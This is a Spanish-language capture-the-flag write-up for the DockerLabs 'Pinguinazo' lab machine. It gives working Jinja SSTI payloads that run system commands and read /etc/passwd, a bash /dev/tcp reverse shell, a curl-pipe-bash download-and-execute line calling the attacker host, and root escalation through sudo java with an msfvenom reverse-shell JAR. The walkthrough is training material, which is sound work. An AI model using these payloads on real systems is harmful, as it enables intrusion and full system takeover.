# Máquina pinguinazo

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/xeNVTA5B#RXNj1lKF2Gab1HwAWE1SdMtb8CFPJh4le7jsSWjZ7qc)

![imagen](https://github.com/user-attachments/assets/f59831aa-e3cb-4b74-b7c6-8db50066bf78)


- **Nombre de la Máquina:** Pinguinazo
- **Sistema Operativo:** Linux
- **Dificultad:** Easy
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - **HTML Injection:** Permite ejecutar código HTML malicioso en la página web de Pinguinazo.
  - **Server-Side Template Injection (SSTI):** Aprovechada para ejecutar comandos en el servidor mediante plantillas mal configuradas.
- **Escalada de Privilegios:**
  - Aprovechamiento de `sudo java` para ejecutar código como root sin autenticación, utilizando un archivo JAR malicioso generado con `msfvenom`.

 
Aquí tienes el texto reescrito con otras palabras:

## Reconocimiento y Enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina objetivo para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/e686028a-5f9b-414e-846b-dc082e9cdc1a)

Nos muestra que el puerto 5000 está abierto. Realizamos un análisis más detallado para determinar qué servicio está ejecutándose en ese puerto.

```bash
sudo nmap -p 5000 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/7537dd41-333f-4089-b7a3-09d00afe69be)

- Puerto 5000: servicio upnp?

El primer paso es examinar los vectores de entrada disponibles en el puerto 5000. Descubrimos que es una plantilla generada con Jinja.

![imagen](https://github.com/user-attachments/assets/d3fb3e36-a6f4-4e43-81c1-09dd68106ff4)

Continuamos con el análisis y descubrimos una página web con un formulario sencillo que solicita cierta información. Vamos a verificar si es vulnerable a la inyección de HTML. Escribimos el siguiente código en el campo PinguNombre:

```html
<marquee>Pwned</marquee>
```

Y comprobamos que es vulnerable.

![imagen](https://github.com/user-attachments/assets/6112910f-5514-4e04-b74b-7fada8b19fe2)

Intentamos hacer un SSTI (Server Side Template Injection)
`{{5*5}}`

![imagen](https://github.com/user-attachments/assets/24f0e930-aabd-4372-9f65-d6d64b5a67b1)

Y vemos que es vulnerable a este ataque.

Ahora es momento de ejecutar comandos de Linux a través de la vulnerabilidad detectada. Al navegar por Internet, encontramos varias páginas que nos ofrecen payloads y comandos ya listos para usar.

En esta página [web](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) encontramos varios payloads útiles.

Vamos a ejecutar uno para determinar qué usuario somos:

```html
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![imagen](https://github.com/user-attachments/assets/45211a9d-b405-4d3d-95c8-587ec6ab50e8)

Ejecutando el comando `id` vemos que pertenecemos al grupo pinguinazo.

También podremos leer el `/etc/passwd`.

```html
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

![imagen](https://github.com/user-attachments/assets/c3ff9fb7-be24-4d92-991b-e1aabba1438c)

Ahora que podemos ejecutar comandos a nivel de sistema, es momento de establecer una reverse shell para obtener acceso completo al servidor.

Primero, abrimos un puerto en nc en modo de escucha con el siguiente comando en nuestra máquina atacante:

```bash
nc -nlvp 443
```

![imagen](https://github.com/user-attachments/assets/f76d4ab8-a266-412a-a3c5-9ff990d8beaf)

Estamos tratando de obtener acceso completo al servidor a través de una reverse shell. Sin embargo, debido a las restricciones de la plantilla Jinja, no podemos ejecutar directamente una reverse shell con el comando típico. Por lo tanto, creamos un script bash en nuestra máquina atacante y lo servimos a través de HTTP para que el servidor vulnerable lo descargue y ejecute.

### Pasos detallados:

1. **Creación del script de reverse shell:**
   Creamos un script básico en bash con el siguiente contenido:
   
   ```bash
   bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
   ```
   Guardamos este script como `reverse_shell.sh`.

   ![imagen](https://github.com/user-attachments/assets/e88e1aa5-545e-4ed6-ac51-0deedd11c2de)

2. **Servidor HTTP:**
   Usamos Python para abrir un servidor HTTP en el puerto 80 y poder compartir el script. Esto se hace ejecutando el siguiente comando en nuestra máquina atacante:
   
   ```bash
   python3 -m http.server 80
   ```

3. **Descargar y ejecutar el script desde el servidor vulnerable:**
   Utilizamos el siguiente comando en la web vulnerable para descargar y ejecutar nuestro script de reverse shell:

   ```html
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://172.17.0.1/reverse_shell.sh | bash').read() }}
   ```

### Explicación de los pasos:

1. **Script de reverse shell:**
   - El script bash contiene el comando necesario para abrir una reverse shell y conectar de vuelta a nuestra máquina atacante en el puerto 443. 
   - Esto nos permite ejecutar comandos en el servidor víctima desde nuestra máquina.

2. **Servidor HTTP con Python:**
   - Servimos el script a través de HTTP utilizando el módulo `http.server` de Python. Esto es conveniente porque casi todas las distribuciones de Linux tienen Python preinstalado, y es fácil de usar.
   - El servidor HTTP permite que el servidor vulnerable descargue nuestro script cuando solicitamos la URL `http://172.17.0.1/reverse_shell.sh`.

3. **Descarga y ejecución del script:**
   - En lugar de intentar ejecutar directamente una reverse shell (lo cual podría ser bloqueado o restringido por la configuración del servidor), descargamos el script desde nuestra máquina atacante y lo ejecutamos.
   - Esto nos da una forma de superar las restricciones de la plantilla Jinja y obtener acceso completo al servidor.

Siguiendo estos pasos, logramos establecer una conexión de reverse shell y obtener control sobre el servidor objetivo, eludiendo las restricciones iniciales impuestas por el entorno de la plantilla Jinja.

![imagen](https://github.com/user-attachments/assets/65206fa1-5c61-438e-9ef8-aa6f884352aa)

## Escalada de privilegios
Para realizar la escalada de privilegios en el servidor comprometido, aprovechamos los permisos de ejecución del comando `java` como usuario root sin requerir contraseña.

### Paso a paso para la escalada de privilegios:

1. **Verificación de permisos:**
   Al ejecutar `sudo -l`, confirmamos que tenemos la capacidad de ejecutar `java` como root sin necesidad de ingresar contraseña.

   ![imagen](https://github.com/user-attachments/assets/19cbc6a4-8ea7-4397-ba2b-6ff652a631df)

2. **Investigación y preparación:**
   Investigamos en una fuente confiable [web](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-java-privilege-escalation/) que detalla cómo podemos escalar privilegios usando `sudo java`.

3. **Creación del archivo JAR malicioso:**
   Utilizamos `msfvenom` para generar un archivo JAR que contenga un payload de reverse shell. Esto se logra con el siguiente comando:
   ```bash
   msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f jar -o shell.jar
   ```

4. **Configuración de la reverse shell:**
   Configuramos nuestra máquina atacante para escuchar conexiones entrantes en el puerto 4444:
   ```bash
   nc -nlvp 4444
   ```

5. **Servir el archivo JAR a través de HTTP:**
   Iniciamos un servidor HTTP en nuestra máquina atacante para que el servidor vulnerable pueda descargar el archivo JAR:
   ```bash
   python3 -m http.server 81
   ```
   En la máquina víctima, descargamos el archivo JAR utilizando `curl`:
   ```bash
   curl http://172.17.0.1/shell.jar -o shell.jar
   ```

6. **Ejecución del exploit:**
   Finalmente, ejecutamos el comando `java` con privilegios de sudo para ejecutar el archivo JAR malicioso desde la ubicación temporal:
   ```bash
   sudo /usr/bin/java -jar /tmp/shell.jar
   ```

7. **Obtención de acceso root:**
   Con el comando anterior, logramos establecer una conexión de reverse shell como usuario **root** en nuestra máquina atacante, que está a la escucha en el puerto 4444.

   ![imagen](https://github.com/user-attachments/assets/79a596bb-58a0-4b45-b219-dbaa9977e2a1)

### Explicación:
- **Paso 1:** Verificamos los permisos de sudo para `java` que nos permiten ejecutar comandos como root.
- **Paso 2:** Investigamos y preparamos el exploit siguiendo las instrucciones de una fuente confiable.
- **Paso 3 y 4:** Creamos un archivo JAR malicioso con un payload de reverse shell y configuramos nuestra máquina para recibir la conexión entrante.
- **Paso 5:** Utilizamos un servidor HTTP para servir el archivo JAR malicioso al servidor vulnerable.
- **Paso 6:** Ejecutamos el comando `java` con sudo para iniciar la reverse shell desde el archivo JAR.
- **Paso 7:** Confirmamos que la escalada de privilegios fue exitosa al recibir una shell como root en nuestra máquina atacante.

Siguiendo estos pasos detallados, conseguimos obtener acceso root en el servidor mediante una escalada de privilegios utilizando `sudo java`. Este método nos permitió sortear las restricciones de seguridad y obtener el control completo del sistema comprometido.
